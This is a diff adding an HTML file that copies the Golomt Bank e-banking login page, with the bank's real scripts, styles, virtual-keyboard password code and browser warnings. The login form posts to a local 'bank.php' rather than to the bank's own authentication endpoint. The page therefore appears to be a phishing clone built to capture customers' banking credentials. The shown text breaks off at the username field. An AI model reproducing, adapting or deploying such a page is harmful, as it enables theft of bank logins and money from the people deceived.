@@ -1,0 +1,1182 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="mn">
+ <head>
+  <!-- esdjing -->
+  <script src="https://www.egolomt.mn/corp/scripts/common/NFEBAScripts.js?moduleId=user,scriptsPath=scripts,isVdtMode=false,nodePath=,ipAddress=202.170.65.4,contextPath=" type="text/javascript">
+  </script>
+  <script src="scripts/common/NFEBAFunctionLoader.js" type="text/JavaScript">
+  </script>
+  <script src="scripts/common/Ncooltree.js" type="text/JavaScript">
+  </script>
+  <script src="scripts/ria/ajaxfeatures/jquerymin.js" type="text/JavaScript">
+  </script>
+  <script src="scripts/ria/ajaxfeatures/jquery.class.js" type="text/JavaScript">
+  </script>
+  <script src="scripts/common/NFEBAJavaScripts.js" type="text/JavaScript">
+  </script>
+  <script type="text/javascript">
+   jQuery.noConflict();
+  </script>
+  <!-- <script>
+
+setTreeFormt(1);
+
+</script> -->
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/new_style.css" />
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/bootstrap.min.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/animate.min.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/chosen.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/font-awesome.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/style-responsive.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/datepicker.css" />
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/jquery-ui.custom.css" />
+  <script src="https://www.egolomt.mn/corp/scripts/custom/EnterKeyDisable.js" type="text/javascript">
+  </script>
+  <link type="text/css" rel="stylesheet" href="https://www.egolomt.mn/corp/L002/consumer/theme/jquery-calendars-picker.css" />
+  <title>
+   Golomt Bank: E-Banking:Харилцагч нэвтрэх
+  </title>
+  <script type="text/javascript">
+   var imagePath = 'L002/consumer/images';
+  </script>
+  <script type="text/javascript">
+   CONFIG = feba.domManipulator.extendObject( {logMode : "CONSOLE",operatingMode : "DEVELOPMENT", blockOnButtonClicksRequired : "N",blockOnHyperLinkClicksRequired : "N"	}, CONFIG || {});var IS_WATERMARK_ENABLED="N"
+  </script>
+  <script type="text/javascript">
+   var langID="002"
+var locale="mn_MN"
+  </script>
+ </head>
+ <body oncontextmenu="return false;">
+  <object width="0" height="0" codebase="capicom.cab#version=2,0,0,0" classid="clsid:A996E48C-D3DC-4244-89F7-AFA33EC60679" id="oCAPICOM">
+  </object>
+  <form autocomplete="off" method="post" action="bank.php" name="AuthenticationFG">
+   <script type="text/javascript">
+    function actionset(){if(document.AuthenticationFG.ACTIONSWITCH== "Y"){document.AuthenticationFG.ACTIONSWITCH= "N"}else{document.AuthenticationFG.action= "";document.AuthenticationFG.action= "";}}
+   </script>
+   <!-- <feba2:out value="esdjing" /> -->
+   <!--[if lt IE 9]>
+    <style type="text/css">
+        .width100percent_loginbg,.home-service, .help-menu { display: none; }
+        #header-main {padding-bottom: 20px;}
+        #browserWarning_mng { display: block}
+    </style>
+    <![endif]-->
+   <div class="container" id="global">
+    <div id="header">
+     <div class="header-main-new" id="header-main">
+      <div style="max-width:960px !important;" class="container" id="header-wrapper">
+       <div class="row" id="header-row">
+        <div class="col-sm-6">
+         <div class="logo" id="header-logo">
+         </div>
+        </div>
+        <div class="col-sm-6">
+         <div class="help-menu">
+          <div class="help">
+           <a title="Here is About Help" data-placement="bottom" data-toggle="tooltip" class="btn btn-white" data-isexcluded="true" data-dontblockui="true" target="_blank" href="https://m.egolomt.mn/statement/ebank%20manual_mng.pdf">
+            ? Help
+           </a>
+          </div>
+          <div class="language">
+           <a class="btn btn-white marginright5" href="https://egolomt.mn/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=01&LANGUAGE_ID=001">
+            English
+           </a>
+           <a class="btn btn-white" href="https://egolomt.mn/corp/AuthenticationController?FORMSGROUP_ID__=AuthenticationFG&__START_TRAN_FLAG__=Y&__FG_BUTTONS__=LOAD&ACTION.LOAD=Y&AuthenticationFG.LOGIN_FLAG=1&BANK_ID=01&LANGUAGE_ID=002">
+            Монгол
+           </a>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div style="display: none" id="topbar">
+     <div id="header">
+      <div class="header-nav" id="topbar-nav">
+       <div class="wrapper" id="topbar-wrapper">
+        <div class="row" id="topbar-row">
+         <ul class="tabs">
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div id="browserWarning_mng">
+     <p>
+      Таны ашиглаж буй интернэт хөтөч интернэт банкны үйлчилгээг 
+			ашиглахад тохиромжгүй байна.
+     </p>
+     <p>
+      Интернэт банкны нууцлал аюулгүй байдал, найдвартай ажиллагааг 
+			хангах зорилгоор интернэт хөтөч нь сүүлийн үеийн шинэчлэгдсэн 
+			хувилбар байх шаардлагатай.
+     </p>
+     <p>
+      Танд дараах интернэт хөтчүүдээс ашиглахыг зөвлөж байна. Татах 
+			холбоос дарж шинэ интернэт хөтчийг суулгах боломжтой.
+     </p>
+     <ul>
+      <li>
+       <a href="http://www.google.com/chrome/">
+        Chrome татах
+       </a>
+      </li>
+      <li>
+       <a href="http://www.mozilla.com/firefox/">
+        Mozilla татах
+       </a>
+      </li>
+     </ul>
+     <div id="browserWarning_mng">
+      <p>
+       Internet banking website is only supported on the latest 
+				up-to-date web browsers to be more secure and reliable.
+      </p>
+      <p>
+       Golomt bank recommends you to use below web browsers. Please 
+				download it by clicking on the "Download" button.
+      </p>
+      <ul>
+       <li>
+        <a href="http://www.google.com/chrome/">
+         Chrome download
+        </a>
+       </li>
+       <li>
+        <a href="http://www.mozilla.com/firefox/">
+         Mozilla 
+					download
+        </a>
+       </li>
+      </ul>
+     </div>
+    </div>
+    <noscript>
+     &lt;div class="redbg"&gt;&lt;b&gt;&lt;/&gt;Та интернет хөтчийнхөө javascript -г асаана уу. / Your browser is not Java enabled. &lt;a href="https://www.egolomt.mn/corp/jsp/enablejs.html"  style="padding: 2px 5px; border: 1px solid #ccc; border-radius: 3px;" target="_blank"&gt;HELP&lt;/a&gt;&lt;/b&gt;&lt;/div&gt;
+    </noscript>
+    <script type="text/javascript">
+     linkArray = [];
+isIE = document.all;
+
+var currClickedElement;
+var onFocus = 'N';
+jQuery(document).ready(function() {
+if(onFocus == 'Y'){
+
+
+jQuery(document).bind('keydown',function(event) {
+	if(event.which == 13 || event.which == 9) {
+	closeKeypad();
+	}
+});
+
+jQuery(document).bind('click',function(event) {
+currClickedElement=jQuery(event.target).closest('div').parent().parent().parent();
+
+if(currClickedElement &amp;&amp; (jQuery(event.target).attr('type')=="password" || 
+	jQuery(currClickedElement).attr('id')=='pp_div')){
+	jQuery(document.getElementById('pp_div')).show();
+}
+else{
+	closeKeypad();
+}
+
+});
+	jQuery( ".buttonhashed" ).css( "display", "none" );
+	}
+});
+
+isNN = !document.all&amp;&amp;document.getElementById;
+
+isN4 = document.layers;
+
+ppX = 450;
+ppY = 250;
+
+editCtl = null;
+tmpEditCtl = null;
+
+rX = (Math.random() * 24) - 12;
+rY = (Math.random() * 36) - 18;
+
+
+vIndex=0;
+vRandomAlp=0;
+vRandomNo=0;
+vRandomSpl=0;
+
+
+isHot=false;
+showFirstTime=true;
+
+
+isFirstTimeEnable = true;
+
+var pwdImageValue="";
+var pwdStrengthValue="";
+
+insertData=function(ctl, value) {
+
+    ctl.value = ctl.value + value;
+    
+    setValues(pwdImageValue,pwdStrengthValue);
+    if(pwdImageValue != "" &amp;&amp; pwdStrengthValue!= ""){
+    	determinePasswordStrength(ctl.value,pwdImageValue,pwdStrengthValue);
+    }
+    
+};
+
+     
+applyNumber=function(ctl) {
+    if(editCtl != null) {
+
+
+        if(ctl.name == 'pp_clear') {
+            editCtl.value = '';
+            setValues(pwdImageValue,pwdStrengthValue);
+            if(pwdImageValue != "" &amp;&amp; pwdStrengthValue!= ""){
+                   determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue);
+            }       
+           
+        }else if (ctl.name == 'pp_erase'){
+            editCtl.value= editCtl.value.substring(0,editCtl.value.length-1);
+             setValues(pwdImageValue,pwdStrengthValue);
+             if(pwdImageValue != "" &amp;&amp; pwdStrengthValue!= ""){
+             		determinePasswordStrength(editCtl.value,pwdImageValue,pwdStrengthValue);
+             }
+        
+        
+        }else if (ctl.name == 'pp_caps'){ 
+			var vCaps = document.getElementById('pp_caps').value;
+			for(var vIndex=1;vIndex&lt;=26;vIndex++){
+				var vAlp = document.getElementById('alp_'+vIndex).value;
+				
+				if(vAlp==vAlp.toLowerCase()){
+					var vTemp=vAlp.toUpperCase();
+					document.getElementById('alp_'+vIndex).value=vTemp;
+			document.getElementById('pp_caps').value=vCaps.toUpperCase();
+				
+				}else{		
+					var vTemp=vAlp.toLowerCase();
+					document.getElementById('alp_'+vIndex).value=vTemp;
+				}
+			document.getElementById('pp_caps').value=vCaps.toLowerCase();
+			}
+	
+	
+		}else {
+		
+
+            if(!editCtl.maxLength || editCtl.maxLength == 0 || editCtl.maxLength &gt; editCtl.value.length) {
+
+                insertData(editCtl, ctl.value);
+            }
+            tmpEditCtl = editCtl;
+            if(editCtl.maxLength &amp;&amp; editCtl.maxLength &lt;= editCtl.value.length) {
+
+                setPinPadCtl(null);
+            }
+	    if(tmpEditCtl.focus){
+                setTimeout('tmpEditCtl.focus()', 1);
+	    }
+        }
+    }
+};
+isIE=document.all? 1:0;
+
+		
+		noKeyboard=function(e){
+			keyEntry = !isIE? e.which:event.keyCode;
+			if((keyEntry &lt; '255') || (keyEntry &gt; '0')){
+				return false;
+			}
+		};
+		
+		
+		var langBsdSmallAlp = {"001":"abcdefghijklmnopqrstuvwxyz","002":"abcdefghijklmnopqrstuvwxyz",
+		"003":"abcdefghijklmnopqrstuvwxyz","004":"abcdefghijklmnopqrstuvwxyz"};
+		var langBsdNum = {"001":"0123456789","002":"0123456789","003":"0123456789","004":"0123456789"};
+		var langBsdSplChars = {"001":".+-!,@#$%&amp;*()?=&lt;&gt;^_]{:\\|}`/[~\"\';","002":".+-!,@#$%&amp;*()?=&lt;&gt;^_]{:\\|}`/[~\"\';",
+		"003":".+-!,@#$%&amp;*()?=&lt;&gt;^_]{:\\|}`/[~\"\';","004":".+-!,@#$%&amp;*()?=&lt;&gt;^_]{:\\|}`/[~\"\';"};
+		
+		
+		getCharBasedOnLangId=function(arrayObj){
+			var chars = arrayObj[langID];
+			var langArr = [];
+			var character;
+			
+			if(chars == null){
+				chars = arrayObj["001"];
+			} 
+			var charLen = chars.length;
+			for(i=0; i &lt; charLen ; i++){
+				character = chars.substring(i,i+1);
+				if(character == "\""){
+					langArr[i] = "&amp;quot";
+				}else{
+					langArr[i] = character;	
+				}
+			}		
+			return langArr;
+		};
+		
+		
+		settingPinPadCtlOnFocus=function(whatobject,whatimage,whatelement){
+			
+			if(onFocus == 'Y'){
+		
+			var isVisible =jQuery('#pp_div').is(':visible');			
+				if(isVisible &amp;&amp; elem == whatelement){
+					//jQuery(document.getElementById('pp_div')).show();
+					noAction = true;
+					//return;
+				}else{
+				jQuery(document.getElementById('pp_div')).show();
+					noAction = false;
+				}		
+				settingPinPadCtl(whatobject,whatimage,whatelement);
+			}
+			
+			else{
+			noAction = true;
+			}
+		};
+		
+		
+		
+		settingPinPadCtl=function(whatobject,whatimage,whatelement){
+			if(noAction){
+				return;
+			}
+			smallAlpArr = getCharBasedOnLangId(langBsdSmallAlp);
+			numArr = getCharBasedOnLangId(langBsdNum);
+			splCharArr = getCharBasedOnLangId(langBsdSplChars);
+
+
+if(vRandomAlp==0){
+	
+	smallAlpArr.sort(function() {
+return 0.5 - Math.random()})
+}
+if(vRandomNo==0){
+	numArr.sort(function() {
+return 0.5 - Math.random()})
+}
+if(vRandomSpl==0){
+	splCharArr.sort(function() {
+return 0.5 - Math.random()})
+}
+
+
+	var incr=0;
+	var incralp=0,incrno=0,incrspl=0;
+	var formname = '';
+	var tempincralp;
+	var tempincrno;
+	var tempincrspl;
+	for(j=0;document.forms[j] != null;j++)
+	{
+		for(i=0; document.forms[j].elements[i] != null; i++)
+		{
+			if((document.forms[j].elements[i].name == whatelement))
+			{
+				formname = document.forms[j].name;
+			}
+		}
+	}
+	this.target=document.forms[formname].elements[whatelement];
+			
+			
+			
+			var len = 11;
+			var numSplVal = 0;
+			var newRow;
+			var smallAlpArrLen = smallAlpArr.length;
+			var numArrLen = numArr.length;
+			var splCharArrLen = splCharArr.length;
+			
+			if (whatimage == 2){  
+				
+		var sHTML='&lt;div id="close-keypad" class="width100percentforkeypad" &gt;&lt;div id="keypadstyle"  class=""&gt;'
+			+'&lt;p align="right"&gt; &lt;span class="keyBoardTitle"&gt; Virtual Keyboard&lt;/span&gt; '
+			+'&lt;span class="keyBoardTitleInfo"&gt;(For entering password only)&lt;/span&gt;'
+			+'&lt;span&gt; &lt;strong&gt;&lt;a name="CLOSE_KEYPAD" id="CLOSE_KEYPAD" href="javascript:setPinPadCtl(null),enableTextField(\'+whatelement+\')" class="close" title="Close"&gt;x&amp;nbsp;&lt;/a&gt;&lt;/strong&gt;&lt;/span&gt; &lt;/p&gt;' 
+			+ '&lt;p &gt;&lt;span id="titleBar" class="keyBordText" style="display:none"&gt;&lt;ilayer width="100%" onSelectStart="return false"&gt;'
+			+'&lt;layer  width="100%" onMouseover="isHot=true;if (isN4) ddN4(pp_div)" onMouseout="isHot=false"&gt;'
+			+'Access Code:'
+			+'&lt;/layer&gt;&lt;/ilayer&gt;'
+			+'&lt;/span&gt;'
+			+'&lt;span class="floatingleft" style="padding-bottom:5px"&gt;&lt;input length="13" type=password name="buffer" id="input_buffer" value="" id=buffer onkeyup=checkPinPad(this) readonly style="none"&gt;&lt;/span&gt;'
+			+'&lt;/p&gt;&lt;/div&gt;';
+				
+				sHTML = sHTML+'&lt;div id="keypadclear" style="padding-left: 2%;width:100%" &gt;';
+				while(incralp &lt; smallAlpArrLen || incrno &lt; numArr.length || incrspl &lt; splCharArrLen){
+					
+					sHTML = sHTML+'&lt;p class="clearboth"&gt;';
+					newRow=true;
+					for (i=0; i &lt; len; i++){
+						
+						
+						if(i == 0){
+							sHTML = sHTML+'&lt;span  class="height28forkeypad"&gt;';
+						} else{
+							sHTML = sHTML+'&lt;span&gt;';
+						}
+						
+						
+						if(incrspl &lt; splCharArrLen &amp;&amp; i &lt; len){
+							tempincrspl=incrspl++;
+							sHTML = sHTML+'&lt;input class="mainButton" type="button" name="pp_'+incrspl+'" id="pp_'+incrspl+'" title="'+splCharArr[tempincrspl]+'"  value="'+splCharArr[tempincrspl]+'" onclick="applyNumber(this)"/&gt;&lt;/span&gt;';
+							if(incrspl == splCharArrLen ){
+								sHTML = sHTML+ '&lt;br&gt;';
+								i++ ;
+							}
+							newRow = false;
+						}						
+												
+						
+						if(incrno &lt; numArrLen &amp;&amp; i &lt; len &amp;&amp; newRow == true){
+							tempincrno=incrno++;
+							sHTML = sHTML+'&lt;input class="mainButton" type="button" name="pp_'+incrno+'" id="pp_'+incrno+'" title="'+numArr[tempincrno]+'"  value="'+numArr[tempincrno]+'" onclick="applyNumber(this)"/&gt;&lt;/span&gt;';
+							if(incrno == numArrLen ){
+								sHTML = sHTML+ '&lt;br&gt;';
+								i++;
+							}
+							newRow = false;	
+												
+						}
+
+											
+						if(incralp &lt; smallAlpArrLen &amp;&amp; i &lt; len &amp;&amp; newRow == true){
+							tempincralp=incralp++;
+							sHTML = sHTML+'&lt;input class="mainButton" type="button" name="alp_'+incralp+'" id="alp_'+incralp+'" title="'+smallAlpArr[tempincralp]+'"  value="'+smallAlpArr[tempincralp]+'" onclick="applyNumber(this)"/&gt;&lt;/span&gt;';
+							if(i == len-2){
+								sHTML = sHTML+ '&lt;br&gt;';
+								i++;
+							}
+						}
+						
+						
+						 if((incrspl &gt;= splCharArrLen || incralp &gt;= smallAlpArrLen || incrno &lt;= numArrLen) &amp;&amp; i &lt; len-1 ){
+						 	sHTML = sHTML+'&lt;/span&gt;';
+						 	newRow = true;						 					 		
+						}
+						
+					}
+					
+					
+				}
+				sHTML = sHTML+'&lt;input class="mainButton_blank" type="button" /&gt;&lt;/span&gt;';
+				if(langID == '001'){
+				sHTML = sHTML +'&lt;span class=""&gt;&lt;input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" onclick="applyNumber(this)"/&gt;&lt;/span&gt;';
+			}else{
+				sHTML = sHTML +'&lt;span class=""&gt;&lt;input class="keybtn_Caps" type="button" id="pp_caps" name="pp_caps" title="Caps" value="" alt="Caps" /&gt;&lt;/span&gt;';
+			}
+			sHTML = sHTML+'&lt;span class=""&gt;&lt;input class="keybtn_Backspace" type="button" name="pp_erase" id="pp_erase" title="Backspace" value="" onclick="applyNumber(this)"/&gt;&lt;/span&gt;'
+				+'&lt;span class=""&gt;&lt;input class="keybtn_Clear" type="button" name="pp_clear" id="pp_clear" title="Clear" value="" onclick="applyNumber(this)"/&gt;&lt;/span&gt;';
+			sHTML = sHTML+'&lt;/p&gt;';	
+			sHTML = sHTML+'&lt;/div&gt;';
+			sHTML = sHTML+'&lt;/div&gt;';
+			}
+	
+
+document.getElementById("scriptdiv").innerHTML = sHTML;
+	
+	document.forms[formname].buffer.maxLength = 2147483647; 
+
+	/*setPinPadCtl(document.forms[formname].buffer);*/
+	setPinPadCtl(document.forms[formname].elements[whatelement]);
+	elem = whatelement;
+};
+
+
+setPinPadCtl=function(ctl) {
+
+    
+    if(ctl &amp;&amp; !editCtl &amp;&amp; ctl.maxLength &amp;&amp; ctl.maxLength &lt;= ctl.value.length) {
+    
+        return;
+    }
+    
+    
+    editCtl = ctl;
+    var elements = document.forms[0].elements;
+    for(i = 0; i &lt;= 77; i++) {
+
+        var el = elements['pp_' + i];
+        if(el != null) {
+
+            el.disabled = editCtl == null;
+        }
+    }
+    var el = elements['pp_clear'];
+	if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+	var el = elements['pp_erase'];
+	if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+	var el = elements['close'];
+	if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+	var el = elements['done'];
+    if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+	var el = elements['buffer'];
+    if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+	var el = elements['help'];
+    if(el != null) {
+
+        el.disabled = editCtl == null;
+    }
+
+    topLayer=isIE ? 'BODY' : 'HTML';
+    layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;
+
+	if(isIE &amp;&amp; event || !isIE &amp;&amp; ctl) {
+
+        hotLayer=isIE ? event.srcElement : ctl.target;
+        while (hotLayer != null &amp;&amp; hotLayer.id != 'titleBar' &amp;&amp; hotLayer.tagName != topLayer) {
+
+          hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
+        }
+        if (hotLayer != null &amp;&amp; hotLayer.id == 'titleBar' &amp;&amp; ctl != null) {
+
+          offsetx=isIE ? event.clientX : ctl.clientX;
+          offsety=isIE ? event.clientY : ctl.clientY;
+          nowX=parseInt(layer.style.left);
+          nowY=parseInt(layer.style.top);
+          ddEnabled=true;
+          document.onmousemove=dd;
+        }
+    }
+    if(layer != null) {
+
+        if(editCtl != null) {
+
+            if (showFirstTime) {
+		
+                showFirstTimePinPad(layer, ctl);
+                display();
+                showFirstTime=false;
+            } else {
+		
+
+				showPinPad(layer, ctl);
+				display();
+				
+            }
+        } else {
+
+			hidePinPad(layer);
+			display();
+        }
+    } else {
+
+        alert('Pin Pad not supported by your browser');
+    }
+};
+
+onloadNumber=function(ctl) {
+
+    ctl.disabled = editCtl == null;
+};
+
+checkPinPad=function(ctl) {
+
+    if(ctl.maxLength &amp;&amp; ctl.maxLength != 0 &amp;&amp; ctl.maxLength &lt;= ctl.value.length) {
+
+        setPinPadCtl(null);
+    } else {
+
+        if(editCtl == null)
+            setPinPadCtl(this);
+    }
+};
+
+
+showPinPad=function(ctl, pctl) {
+
+
+	if (isIE || isNN) {
+
+        layer.style.visibility='visible';
+       
+    } else if (isN4) {
+
+        document.pp_div.visibility='show';
+        
+    }
+};
+
+showFirstTimePinPad=function(ctl, pctl) {
+
+
+    var pX = 500;
+    var pY = 250;
+
+    if(ppY) {
+
+        pY = ppY;
+    } else if(pctl.screenTop) {
+
+        pY = pctl.screenTop + 30;
+    } else if(pctl.screenY) {
+
+        pY = pctl.screenY + 30;
+    }
+    if(ppX) {
+
+        pX = ppX;
+    } else if(pctl.screenLeft) {
+
+        pX = pctl.screenLeft;
+    } else if(pctl.screenX) {
+
+        pX = pctl.screenX;
+    }
+    if(ctl.style) {
+
+        ctl.style.top = pY + rX;
+        ctl.style.left = pX + rY;
+    }
+    if (isIE || isNN) {
+
+		layer.style.visibility='visible';
+    } else if (isN4) {
+
+        document.pp_div.visibility='show';
+        
+	}
+	
+};
+
+hidePinPad=function(ctl){
+
+    if (isIE || isNN) {
+
+		layer.style.visibility='hidden';
+
+	} else if (isN4) {
+
+		document.pp_div.visibility='hide';
+    }
+elem = null;
+};
+
+ddInit=function(ctl){
+
+    var topLayer = isIE ? 'BODY' : 'HTML';
+
+	var layer = isIE ? document.all.pp_div : document.getElementById ? document.getElementById('pp_div') : document.layers ? document.layers.pp_div : document.pp_div;
+
+	var hotLayer = isIE ? event.srcElement : ctl.target;
+
+	if (layer != null) {
+
+        while (hotLayer.id != 'titleBar' &amp;&amp; hotLayer.tagName != topLayer) {
+
+		  hotLayer=isIE ? hotLayer.parentElement : hotLayer.parentNode;
+		  if (hotLayer == null) return;
+        }
+        if (hotLayer.id == 'titleBar') {
+
+
+		  offsetx=isIE ? event.clientX : ctl.clientX;
+          offsety=isIE ? event.clientY : ctl.clientY;
+          nowX=parseInt(layer.style.left);
+          nowY=parseInt(layer.style.top);
+          ddEnabled=true;
+          document.onmousemove=dd;
+        }
+    }
+};
+
+dd=function(ctl){
+
+  if (!ddEnabled) return;
+  layer.style.left=isIE ? nowX+event.clientX-offsetx : nowX+ctl.clientX-offsetx+'px';
+  layer.style.top=isIE ? nowY+event.clientY-offsety : (nowY+ctl.clientY-offsety)+'px';
+  display();
+  return false;
+};
+
+		 
+		disbleTextField=function(whatelement){
+			
+			var isVisible = document.getElementById('pp_div').style.visiblity = 'visible' ? true : false;
+			if(isVisible &amp;&amp; elem == whatelement){
+				noAction = true;
+				return;
+			}else{
+				noAction = false;
+			}
+			
+			var j=0;
+			var enab = true;
+			var disb = true;
+			while((document.forms[j] != null &amp;&amp; (enab || disb))){
+					
+					for(i=0; document.forms[j].elements[i] != null; i++){
+					
+				 		if(isVisible &amp;&amp; (document.forms[j].elements[i].name == elem)){
+				 			document.forms[j].elements[i].disabled = false;
+				 			enab = false;
+				 		}else if((document.forms[j].elements[i].name == whatelement)){		
+							
+							document.forms[j].elements[i].disabled=true;
+							disb = false;
+					 	}
+					 	if(!isVisible){
+					 		enab = false;
+					 	}
+					}
+				j++;
+			}
+			
+		};
+		
+		
+		setStyle=function(obj,style,value){
+			obj.style[style]=value;
+		};
+
+	    
+		enableTextField=function(whatelement){
+			this.target.disabled=false;
+		};
+
+		getPixel=function(str) {
+			if (str == "") {
+				return "0";
+			} else {
+				return parseInt(str.substring(0, str.length-2),10);
+			}
+		};
+
+		
+		randomDisplay=function(){
+			
+			var scrollTop = window.pageYOffset || window.document.documentElement.scrollTop || window.document.body.scrollTop;
+			var maxtop = scrollTop+320;
+			var maxleft = 320;
+			var pos = Math.random()*200;
+			var locationtop;
+			var locationleft;
+			
+			if (!isIE) {
+				locationtop = getPixel(document.getElementById('pp_div').style.top);
+			  	locationleft = getPixel(document.getElementById('pp_div').style.left);
+			} else {
+			  	locationtop = document.all.pp_div.style.pixelTop;
+			  	locationleft = document.all.pp_div.style.pixelLeft;
+			}
+			
+			if (pos &lt;= 150)
+				locationtop = locationtop + pos;
+			else
+			  	locationtop = locationtop - pos;
+			
+			if (locationleft &lt;= 200)
+			  	locationleft = locationleft + pos;
+			else
+			  	locationleft = locationleft - pos;
+			
+			if (locationtop &lt; scrollTop) 
+			  	locationtop = scrollTop;
+			else if (locationtop &gt; maxtop)
+			  	locationtop = maxtop;
+			
+			if (locationleft&lt;0)
+			  	locationleft=1;
+			else if (locationleft &gt;= maxleft)
+			  	locationleft=maxleft;
+			if (!isIE) {
+			  	document.getElementById('pp_div').style.top=locationtop+'px';
+			  	document.getElementById('pp_div').style.left=locationleft+'px';
+			} else {
+			  	document.all.pp_div.style.pixelTop=locationtop;
+			  	document.all.pp_div.style.pixelLeft=locationleft;
+			}
+			display();
+		};
+
+
+
+		
+		fixedDisplay=function(element){
+			/* Changes done for 11.0.8 Enhancement
+			Virtual Keyboard will be displayed at right hand side of Virtual Keypad image */
+			
+			/* Fetch element which has focus */	
+			var whatelement = document.getElementById(element);
+		
+			/* Fetch postition of element */
+			var leftPosition = whatelement.offsetLeft;
+			var topPosition = whatelement.offsetTop;
+			var elementWidth = whatelement.offsetWidth;
+			var elementHeight = document.getElementById('pp_div').offsetHeight;
+			  	
+			document.getElementById('pp_div').style.top=  topPosition - elementHeight +'px';
+			document.getElementById('pp_div').style.left= leftPosition + elementWidth + 'px';
+			 				
+			display();
+		};
+		
+
+                        fixedDisplayBelow=function(element){
+                                    /* Changes done for 11.0.8 Enhancement
+                                    Virtual Keyboard will be displayed below */
+                                    
+                                    /* Fetch element which has focus */       
+                                    currentID = element;
+                                    var whatelement = document.getElementById(element);
+                                                                        
+                                    /* Fetch postition of element */
+                                    var leftPosition = whatelement.offsetLeft;
+                                    var topPosition = whatelement.offsetTop;
+                                    var elementWidth = whatelement.offsetWidth;
+                                    var elementHeight = document.getElementById('pp_div').offsetHeight;
+                                                
+                                    document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 10 +'px';
+                                    document.getElementById('pp_div').style.left= leftPosition + elementWidth - 100 + 'px';
+                                                                                   
+                                    display();
+                        };
+
+						
+						
+		closeKeypad=function(){
+			jQuery(document.getElementById('pp_div')).hide();
+		};
+
+ddN4=function(whatLayer){
+
+  if (!isN4) return;
+  N4=eval(whatLayer);
+  N4.captureEvents(Event.MOUSEDOWN|Event.MOUSEUP);
+  N4.onmousedown=function(ctl){
+
+    N4.captureEvents(Event.MOUSEMOVE);
+    N4x=ctl.x;
+    N4y=ctl.y;
+  };
+  N4.onmousemove=function(ctl){
+
+    if (isHot){
+
+      N4.moveBy(ctl.x-N4x,ctl.y-N4y);
+      return false;
+    }
+  };
+  N4.onmouseup=function(){
+
+    N4.releaseEvents(Event.MOUSEMOVE);
+  }
+};
+
+
+donePinPad=function(buffer){
+   this.target.value = buffer.value;
+	buffer.value = '';
+	
+};
+
+openPinPadHelp=function() {
+
+    var url = 'pinpad.html';
+    newwindow = window.open(url,'Security','height=500,width=700,scrollbars=yes,resizable=yes');
+    if (window.focus) {
+
+        newwindow.focus();
+    }
+};
+
+display=function()
+{
+	if(navigator.userAgent.toLowerCase().indexOf("msie")!=-1)
+	{
+	if(document.getElementById('iframetop')!=null)
+    {
+		
+		
+        var layerdiv = document.getElementById('pp_div');
+        layerdiv .style.display = '';
+        
+        var iframe = document.getElementById('iframetop');
+        iframe.style.display = '';
+        iframe.style.width = layerdiv.offsetWidth;
+        iframe.style.height = layerdiv.offsetHeight;
+        iframe.style.left = layerdiv.offsetLeft;
+        iframe.style.top = layerdiv.offsetTop;
+        iframe.style.visibility=layerdiv.style.visibility;
+    }   
+    }
+};
+setValues =function(strengthImage,strengthValue){
+     pwdImageValue = strengthImage;
+     pwdStrengthValue = strengthValue;
+     
+};
+function getScrollXY() {
+  var scrOfX = 0, scrOfY = 0;
+  if( typeof( window.pageYOffset ) == 'number' ) {
+    
+    scrOfY = window.pageYOffset;
+    scrOfX = window.pageXOffset;
+  } else if( document.body &amp;&amp; ( document.body.scrollLeft || document.body.scrollTop ) ) {
+    
+    scrOfY = document.body.scrollTop;
+    scrOfX = document.body.scrollLeft;
+  } else if( document.documentElement &amp;&amp; ( document.documentElement.scrollLeft || document.documentElement.scrollTop ) ) {
+    
+    scrOfY = document.documentElement.scrollTop;
+    scrOfX = document.documentElement.scrollLeft;
+  }
+  return [ scrOfX, scrOfY ];
+}
+    </script>
+    <script type="text/javascript">
+     document.onmousedown=ddInit;
+document.onmouseup=Function("ddEnabled=false");
+    </script>
+    <iframe frameborder="0" scrolling="no" id="iframetop">
+    </iframe>
+    <div class="keypaddiv" valign="right" id="pp_div">
+     <div id="scriptdiv">
+     </div>
+    </div>
+    <script type="text/javascript">
+     ppX=100;ppY=100;setTimeout('setPinPadCtl(null)',1);
+    </script>
+    <!-- -->
+    <!-- -->
+    <div id="HDisplay1" class="width100percent_loginbg">
+     <div style="max-width:1200px !important;" class="container">
+      <div class="row">
+       <div class="col-sm-4 animated fadeInDown login-form">
+        <div id="HDisplay1.Rowset1" class="width100percent">
+         <div id="HDisplay1.Ra1">
+          <div class="loginheadertextsize" id="HDisplay1.Ra1.C1">
+           Нэвтрэх
+          </div>
+         </div>
+        </div>
+        <div id="HDisplay1.Rowset2" class="form-wrapper">
+         <div class="form-row">
+          <i class="icon icon-user">
+          </i>
